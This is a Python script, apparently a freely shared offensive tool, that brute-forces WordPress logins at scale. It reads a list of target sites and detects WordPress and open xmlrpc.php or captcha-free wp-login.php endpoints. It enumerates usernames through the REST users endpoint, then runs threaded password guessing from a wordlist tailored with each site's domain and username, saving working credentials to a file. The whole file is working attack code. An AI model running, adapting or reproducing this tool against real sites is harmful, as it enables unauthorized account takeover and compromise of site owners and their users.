"""
XML-RPC && WP-Login Brute Force Use Custom SSL
This free tools created by t.me/@GrazzMean | https://github.com/fooster1337
edit as much as you like but don't forget to give credit.
if there are any bugs or inaccuracies dm me on telegram
"""

import requests
import socket
import os
import random
import re
import time
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
init()

red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET
yellow = Fore.YELLOW
blue = Fore.BLUE

banner = """                                                      
\033[92m
 █     █░ ██▓███   ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████ 
▓█░ █ ░█░▓██░  ██▒▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ 
▒█░ █ ░█ ▓██░ ██▓▒▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███   
░█░ █ ░█ ▒██▄█▓▒ ▒▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ 
░░██▒██▓ ▒██▒ ░  ░░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒
░ ▓░▒ ▒  ▒▓▒░ ░  ░░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░
  ▒ ░ ░  ░▒ ░     ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░
  ░   ░  ░░        ░    ░   ░░   ░  ░░░ ░ ░   ░         ░   
    ░              ░         ░        ░                 ░  ░
                        ░                                   

XML-RPC | WP-LOGIN BRUTE FORCE
By @GrazzMean                          
"""

thread = 10

class Brute:
    def __init__(self, url):
        self.url = url
        self.thread = thread
        self.headers = {
            "User-Agent": "{}",
            "Accept-Language": "en-US,en;q=0.5"
        }
        self.cert = ("scan/cert.pem", "scan/key.pem")
        self.xmlrpc = 0
        self.wplogin = 0
        self.error_site = 0
        self.good = 0
        self.password = open("top-830_MCR.txt", "r").read()
        self.keyword = {
            "[UPPERLOGIN]": "",
            "[WPLOGIN]": "",
            "[DOMAIN]": "",
            "[UPPERDOMAIN]": "",
            "[FULLDOMAIN]": ""
        }
        self.xmlrpc_lean = False
        self.wplogin_lean = False
        self.sessions = requests.Session()

    def vuln(self, msg):
        print(f"[{green}#{reset}] {self.url} => {green}{msg}{reset}")

    def failed(self, msg):
        print(f"[{red}#{reset}] {self.url} => {red}{msg}{reset}")

    def searchUsername(self):
        try:
            req = requests.get(self.url+"/wp-json/wp/v2/users", headers=self.headers, timeout=10, verify=False).text
            if "slug" in req:
                username = re.findall('"slug":"(.*?)"', req)
                if username:
                    return username
                self.failed("Cannot_Grab_Username")
                return []
            else:
                self.failed("No_Username")
                return []
        except requests.exceptions.Timeout:
            self.failed("Timeout")
        except Exception as e:
            self.failed(e)
    
    def setPassword(self, username):
        pw = self.password
        self.keyword["[UPPERLOGIN]"] = username.upper()
        self.keyword["[WPLOGIN]"] = username 
        self.keyword["[DOMAIN]"] = urlparse(self.url).netloc
        self.keyword["[UPPERDOMAIN]"] = self.url.upper()
        self.keyword["[FULLDOMAIN]"] = self.url
        for key, value in self.keyword.items():
            pw = pw.replace(key, value)
                
        return pw.splitlines()

    def isVulnXmlrpc(self):
        self.headers["User-Agent"] = random_user_agent()
        try:
            req = requests.get(self.url+"/xmlrpc.php", headers=self.headers, timeout=10, verify=False).text
            if "XML-RPC server accepts POST requests only." in req:
                headers = {
                    "Content-Type": "text/xml",
                    "User-Agent": random_user_agent()
                }
                payload = """<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
                post = requests.post(self.url+"/xmlrpc.php", headers=headers, timeout=5, verify=False, data=payload).text
                if "wp.getUsersBlogs" in post:
                    self.vuln("Vuln_Xmlrpc")
                    self.xmlrpc += 1
                    return True
            self.failed("Xmlrpc")
            return False
        except requests.exceptions.Timeout:
            self.failed("Timeout")
        except Exception as e:
            self.failed(e)

    def isVulnWpLogin(self):
        self.headers["User-Agent"] = random_user_agent()
        try:
            req = requests.get(self.url+"/wp-login.php", headers=self.headers, timeout=10, verify=False).text
            if "user_login" in req and "captcha" not in req:
                self.vuln("WpLogin")
                self.wplogin += 1
                return True
            self.failed("WpLogin_Not_Vuln")
            return False
        except requests.exceptions.Timeout:
            self.failed("Timeout")
        except Exception as e:
            self.failed(e)
        
    def bruteXmlrpc(self, username, password):
        payload = f"""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{username}</value></param><param><value>{password}</value></param></params></methodCall>"""
        headers = {
            "User-Agent": random_user_agent(),
            "Content-Type": "text/xml"
        }
        try:
            req = requests.post(self.url+"/xmlrpc.php", headers=headers, verify=False, cert=self.cert, timeout=10, data=payload.encode('utf8')).text
            if "<member><name>isAdmin</name><value>" in req:
                print(f"[{yellow}XMLRPC{reset}] {self.url} => {green}{username}|{password}{reset}")
                self.save_content("good.txt", f"{self.url}/wp-login.php#{username}@{password}")
                return True
            else:
                print(f"[{yellow}XMLRPC{reset}] {self.url} => {red}{username}|{password}{reset}")
        except requests.exceptions.Timeout:
            self.failed("Timeout")
            time.sleep(3)
        except Exception as e:
            self.failed(e)
            time.sleep(3)

    
    def isWordpress(self):
        self.headers["User-Agent"] = random_user_agent()
        try:
            req = requests.get(self.url, headers=self.headers, timeout=10, verify=False)
            if "/wp-content/themes/" in req.text:
                self.vuln("Wordpress")
                return True
            self.failed("Not_Wordpress")
            return False
        except requests.exceptions.Timeout:
            self.failed("Timeout")
        except Exception as e:
            self.failed(e)

    def save_content(self, files, content):
        open(files, "a+", encoding="utf8").write(content+"\n")

    def bruteWpLogin(self, username, password):
        headers = {
            "User-Agent": random_user_agent(),
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = {"log":username, "pwd":password, "wp-submit":"Log-In", "redirect_to":f"{self.url}/wp-admin/", "testcookie":"1"}
        try:
            cooki = self.sessions.get(self.url, allow_redirects=False); cookies = dict(cooki.cookies)
            req = self.sessions.post(self.url+"/wp-login.php", headers=headers, data=data, verify=False,  cookies=cookies).text
            if "/wp-admin/admin-ajax.php" in req or "dashboard" in req:
                print(f"[{blue}WPLOGIN{reset}] {self.url} => {green}{username}|{password}{reset}")
                self.save_content("good.txt", f"{self.url}/wp-login.php#{username}@{password}")
                return True
            else:
                print(f"[{blue}WPLOGIN{reset}] {self.url} => {red}{username}|{password}{reset}")
        except requests.exceptions.Timeout:
            self.failed("Timeout")
        except Exception as e:
            self.failed(e)

    
    def start(self):
        if self.isWordpress():
            if self.isVulnXmlrpc():
                self.xmlrpc_lean = True
            if self.isVulnWpLogin():
                self.wplogin_lean = True

            if self.xmlrpc_lean or self.wplogin_lean:
                self.save_content("wordpress.txt", self.url)
                username = self.searchUsername()
                if username:
                    if self.xmlrpc_lean:
                        with ThreadPoolExecutor(max_workers=self.thread) as j:
                            for user in username:
                                password = self.setPassword(user)
                                for x in password:
                                    brute = j.submit(self.bruteXmlrpc, user, x)
                                    if brute.result():
                                        time.sleep(5)
                                        break

                    if self.wplogin_lean and not self.xmlrpc_lean:
                        with ThreadPoolExecutor(max_workers=self.thread) as j:
                            for usr in username:
                                password = self.setPassword(usr)
                                for pwd in password:
                                    brute = j.submit(self.bruteWpLogin, usr, pwd)
                                    if brute.result():
                                        time.sleep(5)
                                        break
                    

def create_socket(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        res = s.connect_ex((host, port))
        if res == 0:
            s.close()
            return True
        s.close()
        return False
    except:
        return False

def checkPort(host: str):
    scheme = "null"
    url = urlparse("http://"+host).netloc
    try:
        res = create_socket(url, 443)
        if not res:
            res = create_socket(url, 80)
            if res:
                scheme = "http"
        else:
            scheme = "https"
        
        return scheme
    
    except Exception as e:
        return scheme

def parseURL(url):
    if url.startswith("http://"):
        url = url.replace("http://", "")
    elif url.startswith("https://"):
        url = url.replace("https://", "")
    scheme = checkPort(url)
    if scheme == "null":
        return
    url = scheme+"://"+url
    if urlparse(url).path:
        return urlparse(url).scheme + "://" + urlparse(url).netloc + urlparse(url).path
    return urlparse(url).scheme + "://" + urlparse(url).netloc 

def startBrute(url):
    uri = parseURL(url)
    if uri != None:
        if uri.endswith("/"):
            uri = uri.rstrip("/")
        Brute(uri).start()
    else:
        print(f"[{red}#{reset}] {url} => {red}Die Website{reset}")


def random_user_agent() -> str:
    useragent = []
    try:
        if not useragent:
            f = open("scan/user-agent.txt", "r").read().splitlines()
            useragent.extend(f)
        return random.choice(useragent)
    except:
        return "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"

def clear():
    os.system("cls") if os.name == "nt" else os.system("clear")

def createDirectory():
    if not os.path.exists("result_brute"):
        os.makedirs("result_brute")

def main():
    global thread
    try:
        print(banner)
        l = list(dict.fromkeys(open(input("\033[97m[\033[92m+\033[97m] Enter your list: ")).read().splitlines()))
        thread = int(input("\033[97m[\033[92m+\033[97m] Thread : "))
        pool = Pool(thread)
        pool.map(startBrute, l)
        pool.close(); pool.join()
    except Exception as e:
        print(e)

if __name__ == '__main__':
    createDirectory()
    clear()
    main()
    
